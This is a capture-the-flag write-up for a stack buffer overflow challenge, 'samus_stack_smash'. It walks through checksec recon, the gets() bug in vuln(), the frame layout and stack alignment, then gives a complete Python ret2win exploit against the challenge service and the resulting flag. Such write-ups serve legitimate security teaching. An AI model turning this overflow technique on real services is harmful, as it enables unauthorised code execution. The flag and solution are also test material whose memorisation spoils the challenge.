# Samus Stack Smash — Federation Checkpoint Ret2Win

- **Platform:** Riffhack CTF (Biterra) — team `ZKaMYBbs`
- **Author:** CL4Y
- **Artifact:** `samus_stack_smash` (16 336-byte ELF64, x86-64, dynamically linked, not stripped)
- **Service:** `107.170.58.225:1337`
- **Category:** Pwn — stack buffer overflow → call hidden `mission_clear()` win function
- **Flag:** `bitctf{{m37r01d_57ack_0v3rrun}}` *(literal double braces, as accepted by the scorer)*

## TL;DR

`vuln()` calls `gets()` into a 32-byte stack buffer. The binary is built with:

```
RELRO    : Partial
Canary   : NONE
NX       : DISABLED  (executable stack — overkill, not needed here)
PIE      : NONE      (function addresses are static)
```

A hidden `mission_clear()` function reads `/flag.txt` and prints it. Overflow
40 bytes (32 buffer + 8 saved RBP), park a bare `ret` gadget for stack
alignment, then return into `mission_clear`. Flag prints, done.

## Recon

```
$ file samus_stack_smash
samus_stack_smash: ELF 64-bit LSB executable, x86-64, ... not stripped

$ checksec --file=samus_stack_smash
RELRO=Partial  Canary=No  NX=No  PIE=No
```

Symbols visible — three relevant ones:

```
0000000000401216 <mission_clear>
00000000004012d8 <vuln>
0000000000401345 <main>
```

Strings flag the win path immediately:

```
/flag.txt
flag file missing. Contact an admin.
Could not read the flag.
Mission complete! %s
```

## Vulnerability

`vuln()` reserves 0x20 bytes on the stack and calls `gets()` straight into it:

```
   4012e0:  sub    $0x20,%rsp
   4012e4:  lea    msg(%rip),%rax        ; "== Galactic Federation Checkpoint =="
   ...
   401316:  lea    -0x20(%rbp),%rax
   40131a:  mov    %rax,%rdi
   40131d:  mov    $0x0,%eax
   401322:  call   4010f0 <gets@plt>     ; <-- unbounded read into 32-byte buf
   401327:  lea    -0x20(%rbp),%rax
   ...
   40133d:  call   4010d0 <printf@plt>   ; "Telemetry echo: %s\n"
   401342:  nop
   401343:  leave
   401344:  ret
```

Frame layout:

```
[rbp - 0x20]  buf[32]
[rbp + 0x00]  saved rbp     (8 bytes)
[rbp + 0x08]  return address (8 bytes)   <-- overwrite target
```

So we need `32 + 8 = 40` bytes of fill, then an 8-byte return address.

## Win Function

`mission_clear` is wired exactly as a CTF "press button to win" gadget:

```
   401239:  call   fopen@plt              ; fopen("/flag.txt", "r")
   ...
   401275:  call   fgets@plt              ; fgets(buf, 0x80, fp)
   ...
   4012c9:  call   printf@plt             ; "Mission complete! %s"
```

Address: **0x401216** (no PIE, fixed).

## Stack-alignment caveat

After `vuln` executes `ret`, RSP is 16-byte aligned. Jumping straight into
`mission_clear`'s prologue (`endbr64; push rbp; mov rsp,rbp; sub 0x90,rsp`)
leaves RSP at `0x__98` — misaligned by 8. The `call` to `fopen` adds another
8 (push of return address), so fopen itself sees an aligned RSP and works.
But to be safe (and because any future libc with `movaps`-heavy printf would
crash on misalignment), prepend a single bare `ret` gadget to consume an
extra 8 bytes of stack and rebalance:

```
0x401385  <- bare `ret` at the end of main(), used purely as a re-aligner
```

So the final return chain is `[ ret_gadget ][ mission_clear ]`.

## Exploit

```python
# riffhack/scratch/samus_pwn.py
import socket, struct
HOST, PORT = "107.170.58.225", 1337
MISSION_CLEAR = 0x401216
RET_GADGET    = 0x401385         # bare `ret` at end of main, for SSE alignment
p64 = lambda x: struct.pack("<Q", x)

s = socket.create_connection((HOST, PORT))
banner = b""
while b"> " not in banner:
    banner += s.recv(4096)
print(banner.decode())

payload = b"A"*40 + p64(RET_GADGET) + p64(MISSION_CLEAR) + b"\n"
s.sendall(payload)

out = b""
try:
    while True:
        c = s.recv(4096)
        if not c: break
        out += c
except socket.timeout:
    pass
print(out.decode())
```

Run:

```
$ python3 samus_pwn.py
== Galactic Federation Checkpoint ==
Samus, state your authorization glyphs:
> Telemetry echo: AAAAAA...AAAA<garbage>
Mission complete! bitctf{{m37r01d_57ack_0v3rrun}}
```

## Why "looping the same authorization prompt"

The challenge text — *"A Federation checkpoint AI loops the same authorization
prompt while a damaged Chozo console hums behind it"* — is flavour for
exactly this scenario: the guard (`vuln`) keeps asking for glyphs (the
`> Telemetry echo:` prompt), while the "damaged Chozo console" (`mission_clear`)
exists in memory but has no legitimate path called by `main`. The
*"access vault"* is `/flag.txt`. Push past the guard (smash the stack) and
the dead-code function spits out the vault contents.

## Take-aways

- Whenever `checksec` shows **no PIE + no canary + gets()** in the disasm,
  ret2win is the first move. Don't waste time on shellcode unless you have
  to.
- A bare `ret` re-aligner is cheap insurance. It costs one slot in your ROP
  chain and avoids the entire family of "printf crashed inside libc on a
  `movaps`" bugs.
- Always grep the binary for **win functions** before writing complicated
  ROP: a `cat /flag.txt`–shaped routine is the canonical CTF tell.
